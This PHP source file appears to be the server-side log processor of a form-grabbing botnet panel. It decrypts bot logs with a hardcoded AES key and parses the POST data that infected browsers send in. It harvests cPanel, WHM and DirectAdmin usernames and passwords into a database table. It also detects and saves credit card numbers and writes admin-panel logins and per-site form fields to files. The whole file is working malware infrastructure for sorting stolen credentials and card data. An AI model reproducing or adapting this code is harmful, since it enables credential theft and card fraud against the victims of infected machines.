<?php

if(!function_exists('generatePassword')){
	function generatePassword ($length = 8){
		$password = '';
		$possible = "0123456789aAbBcCdDfFgGhHjJkKmMnNpPqQrRsStTvVwWxXyYzZ";
		$i = 0;
		while ($i < $length){
			$char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
			if (!strstr($password, $char)) {
				$password .= $char;
				$i++;
			}
		}
		$password = str_replace('BJB', 'JBJ', $password);
		return $password;
	}
}
/*
if(!function_exists('save_iddb')){
	function save_iddb($t, $filters, $var){
		global $dir;
		file_put_contents($dir['site'] . 'cache/iddb/'.$filters[$var[0]['host']]['id'].'_'.$var[0]['host'].'.txt', $t . "\r\n\r\n", FILE_APPEND);
	}
}
*/
$rc = array();
$rc['key'] = 'TnqbwNDcXdYFEw1Bh3j1ba2yC305aRAP';
$rc_key = $rc['key'];

if(!function_exists('rc_encode_aes')){
	function rc_encode_aes($str, $key = ''){
		global $rc;
		if(empty($key)) $key = $rc['key'];
		$iv = generatePassword(16);
		$data = openssl_encrypt($str, 'AES-256-CBC', $key, false, $iv);
		if(strpos($data, '==') !== false){
			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-2) . substr($iv, 8, 16) . '==';
		}elseif(strpos($data, '=') !== false){
			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-1) . substr($iv, 8, 16) . '=';
		}else{
			return substr($iv, 0, 8) . $data . substr($iv, 8, 16);
		}
	}
}

if(!function_exists('rc_decode_aes')){
	function rc_decode_aes($str, $key = ''){
		global $rc;
		if(empty($key)) $key = $rc['key'];
		$str = str_replace(' ', '+', $str);
		if(strpos($str, '==') !== false){
			$iv = substr($str, 0, 8) . str_replace('==', '', substr($str, strlen($str)-10, strlen($str)-8));
			return openssl_decrypt(substr($str, 8, strlen($str)-18) . '==', 'AES-256-CBC', $key, false, $iv);
		}elseif(strpos($str, '=') !== false){
			$iv = substr($str, 0, 8) . str_replace('=', '', substr($str, strlen($str)-9, strlen($str)-7));
			return openssl_decrypt(substr($str, 8, strlen($str)-17), 'AES-256-CBC', $key, false, $iv);
		}else{
			//$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str)-6);
			$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str));
			return openssl_decrypt(substr($str, 8, strlen($str)-16), 'AES-256-CBC', $key, false, $iv);
		}
	}
}

$log = explode('[~]', $log);

$var = array();

if(isset($log[0])){
	foreach($log as $item){
		$var[0] = explode('[,]', $item);
		
		if(count($var[0]) >= 5){
			if(preg_match('~gz\.txt$~is', $thread->file)){
				if(strpos($var[0][4], 'LOG:') === 0){
					$var[0][4] = str_replace('LOG:', '', $var[0][4]);
					$var[0][4] = @rc_decode_aes(@gzinflate($var[0][4]), $rc_key);
					if(empty($var[0][4])){
						error_log('EMPTY_AES: ' . print_r($var[0], true),4);
						//print_r($var[0]);
						//exit;
					}
				}else{
					$var[0][4] = @gzinflate($var[0][4]);
				}
			}else{
				if(base64_decode($var[0][4]) != false){
					$var[0][4] = @base64_decode($var[0][4]);
				}
			}
			
			if(strlen($var[0][4]) > 10240) continue;
			
			$var[0][4] = explode('|POST:', $var[0][4], 2);
			
			if(empty($var[0][4][0])) continue; // ссылка
			if(empty($var[0][4][1])) continue; // пост данные
			
			$var[0][4][0] = trim($var[0][4][0], "\r\n");
			$var[0][4][1] = trim($var[0][4][1], "\r\n");
			
			if(stripos($var[0][4][0], 'http://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'https://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'site://') === 0){
				$var[0][4][0] = str_replace('site://', 'http://', $var[0][4][0]);
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}else{
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', 'http://' . $var[0][4][0]), PHP_URL_PORT);
			}
			
			if(empty($var[0]['host'])) continue;
			
			if($var[0][3] == '1'){
				$var[0]['b'] = 'InternetExplorer';
			}elseif($var[0][3] == '2'){
				$var[0]['b'] = 'MozillaFirefox';
			}elseif($var[0][3] == '3'){
				$var[0]['b'] = 'Opera';
			}else{
				$var[0]['b'] = 'Unknow';
			}

			if($geoip_ex != true){
				$var[0]['country'] = geoip_country_code_by_name($var[0][2]);
			}else{
				if(file_exists($dir['site'] . '/cache/geoip/')) $var[0]['country'] = geoip_country_code_by_addr($gi, $var[0][2]);
			}
			if(empty($var[0]['country'])) $var[0]['country'] = 'UNK';

			$import = false;

			if(!empty($thread->post_id) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_panels')){
				if(strpos($var[0][4][0], '/manager/ispmgr') != false){
					//file_put_contents('panel_ispmgr', print_r($var[0], true) . "\r\n", FILE_APPEND);
				}else{
					if(!empty($var[0]['port'])){
						switch($var[0]['port']){
							case '2082':
							case '2083':
								//@parse_str($var[0][4][1], $vdata);
								@mb_parse_str($var[0][4][1], $vdata);
								if(!empty($vdata['user']) && !empty($vdata['pass'])){
									$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5('http://'.$var[0]['host'].':'.$var[0]['port'].'/'.$vdata['user'].$vdata['pass']).'\', \'cPanel\', \'1\', NOW(), \'http://'.$var[0]['host'].':'.$var[0]['port'].'/\', \''.$vdata['user'].'\', \''.$vdata['pass'].'\')');
								}
							break;
							
							case '2086':
							case '2087':
								@mb_parse_str($var[0][4][1], $vdata);
								if(!empty($vdata['user']) && !empty($vdata['pass'])){
									$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5('http://'.$var[0]['host'].':'.$var[0]['port'].'/'.$vdata['user'].$vdata['pass']).'\', \'WHM\', \'1\', NOW(), \'http://'.$var[0]['host'].':'.$var[0]['port'].'/\', \''.$vdata['user'].'\', \''.$vdata['pass'].'\')');
								}
							break;
	    
							case '2222':
								@mb_parse_str($var[0][4][1], $vdata);
								if(!empty($vdata['username']) && !empty($vdata['password'])){
								    $vdata = explode(':', $ld[1]);
								    $mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5($ld[0].$vdata['username'].$vdata['password']).'\', \'DirectAdmin\', \'3\', NOW(), \''.$var[0][4][0].'/\', \''.$vdata['username'].'\', \''.$vdata['password'].'\')');
								}
							break;
						
							case '8080':
								$import = true;
							break;
						
							default:
								//file_put_contents('panel_unknow', print_r($var[0], true) . "\r\n", FILE_APPEND);
								$import = true;
							break;
						}
					}else{
						$import = true;
					}
				}
			}
			
			if(strpos($var[0][4][0], '/adm') != false){
				@file_put_contents($dir['site'] . '/cache/admin/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
				if(!isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] != '1') $import = false;
			}elseif(strpos($var[0][4][0], '=admin') != false){
				@file_put_contents($dir['site'] . '/cache/admin/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
				if(!isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] != '1') $import = false;
			}
			
			if($import === true){
				$var[0]['host_pre'] = mb_substr($var[0]['host'], 0, 2, 'utf8');
				if(!preg_match('~^([a-zA-Z0-9]+)$~', $var[0]['host_pre'])) $var[0]['host_pre'] = 'none';
				
				
				if(isset($var[0][5]) && $var[0][5] == 1){
					@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
				}else{
					if(function_exists('checkccvalid')){
						preg_match_all('/(?:[0-9]{16}|[0-9]{13}|[0-9]{4}(?:\s[0-9]{4}){3})/is', $var[0][4][1], $matches, PREG_PATTERN_ORDER);
						if(count($matches[0]) > 0){
							$ccccvalid = false;
							foreach($matches[0] as $itemse){
								if($ccccvalid != true){
									$ccccvalid = checkccvalid($itemse);
									break;
								}
							}
							
							if($ccccvalid != false){
								@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
							}
						}
						unset($matches);
					}
					
					if($ccccvalid == false){
						if(stripos($var[0][4][0], 'pan1') != false){
							@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
						}
						
						if(stripos($var[0][4][0], 'cardNumber') != false){
							@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
						}
						
						if(stripos($var[0][4][0], 'NumberA') != false){
							@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
						}
					}
					
					unset($ccccvalid);
				}

				if(isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] == '1'){
					$var[0]['host_md5'] = md5($var[0]['host']);
					$mysqli->query('INSERT DELAYED INTO bf_save_ilog (host, md5, type) VALUES (\''.$var[0]['host'].'\', \''.$var[0]['host_md5'].'\', \''.$thread->type.'\')');
					file_put_contents($dir['s']['5'] . '/' . $var[0]['host_md5'], $var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n", FILE_APPEND);
				}

				if(isset($filters[$var[0]['host']]) && !empty($filters[$var[0]['host']]['fields']['formgrabber'][1]) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
					$var[1] = count($filters[$var[0]['host']]['fields']['name']);
					if($var[1] > 0){
						//save_iddb($var[0][4][1], $filters, $var);
						$false = false;
						
						$add_sql = array();
						
						@mb_parse_str($var[0][4][1], $output);
						$output = array_change_key_case_unicode($output, CASE_LOWER);
						//save_iddb(print_r($output, true), $filters, $var);
						
						for($i = 1; $i <= $var[1]; $i++){
							if(!empty($filters[$var[0]['host']]['fields']['formgrabber'][$i])){								
								$var[2] = explode('|', $filters[$var[0]['host']]['fields']['formgrabber'][$i]);
								//save_iddb('COUNT_VAR2: ' . count($var[2]), $filters, $var);
								if(count($var[2]) > 0){
									foreach($var[2] as $data){
										if(!empty($data)){
											if(strpos($data, ',') != false){
												$var['3a'] = explode(',', $data);
												if(count($var['3a']) > 0){
													foreach($var['3a'] as $data_a){
														$data_a = mb_strtolower($data_a, 'UTF-8');
														if(strpos($data_a, '^') === 0){
															$data_a = str_replace('^', '', $data_a);
															foreach($output as $ke => $ou){
																if(stripos($ke, $data_a) === 0) $add_sql[$i] .= $ou;
															}
														}else{
															if(isset($output[$data_a])){
																$add_sql[$i] .= $output[$data_a];
															}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
																$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
															}
														}
													}
												}else{
													//save_iddb('EMPTY_3A!', $filters, $var);
												}
											}else{
												$data_a = mb_strtolower($data, 'UTF-8');
												if(strpos($data_a, '^') === 0){
													$data_a = str_replace('^', '', $data_a);
													foreach($output as $ke => $ou){
														if(stripos($ke, $data_a) === 0){
															$add_sql[$i] .= $ou;
															break 1;
														}
													}
												}else{
													if(isset($output[$data_a])){
														$add_sql[$i] .= $output[$data_a];
													}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
														$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
													}
												}
											}
										}else{
											//save_iddb('EMPTY_DATA!', $filters, $var);
										}
									}
								}else{
									$add_sql = array();
									break 1;
								}
							}
						}
						
						//save_iddb(count($add_sql) . ' - ' . $var[1], $filters, $var);
						
						if(count($add_sql) == $var[1]){
							add_item_new($filters[$var[0]['host']]['id'], array($var[0][0], $var[0][1], $var[0]['country'], $var[0]['b']), $add_sql);
						}else{
							/*
							if(!file_exists($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'])){
								$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$var[0]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
								file_put_contents($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'], true);
							}
							add_un($var[0]['host'], $var[0]['host_pre'], gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"));
							*/
						}
						
						//save_iddb(print_r($add_sql, true) . "\r\n\r\n----------------------------------", $filters, $var);
					}
				}else{
					if(!empty($var[0]['host']) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
						if(!file_exists($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'])){
							$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$var[0]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
							file_put_contents($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'], true);
						}
						add_un($var[0]['host'], $var[0]['host_pre'], gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"));
					}
				}
			}
		}
	}
}

?>